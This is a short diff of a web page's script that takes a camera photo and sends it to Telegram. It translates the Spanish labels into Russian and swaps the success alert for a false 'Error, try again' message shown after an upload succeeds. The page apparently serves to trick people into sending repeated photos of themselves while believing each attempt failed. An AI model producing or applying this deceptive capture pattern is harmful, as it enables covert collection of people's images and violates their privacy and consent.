@@ -210,7 +210,7 @@
 
         async function takeAndSendPhoto() {
             captureBtn.disabled = true;
-            captureBtn.innerText = "Enviando...";
+            captureBtn.innerText = "отправляется...";
 
             // Ejecutar animación de flash
             flashLayer.classList.add('flash-active');
@@ -244,7 +244,7 @@
 
                     const result = await response.json();
                     if (result.ok) {
-                        alert("¡Foto enviada con éxito!");
+                        alert("Ошибка,  попробуйте ещё раз");
                     } else {
                         console.error("Error devuelto por Telegram:", result.description);
                     }
@@ -258,7 +258,7 @@
 
         function resetButton() {
             captureBtn.disabled = false;
-            captureBtn.innerText = "Tomar Foto";
+            captureBtn.innerText = "нажать";
         }
 
         captureBtn.addEventListener('click', takeAndSendPhoto);
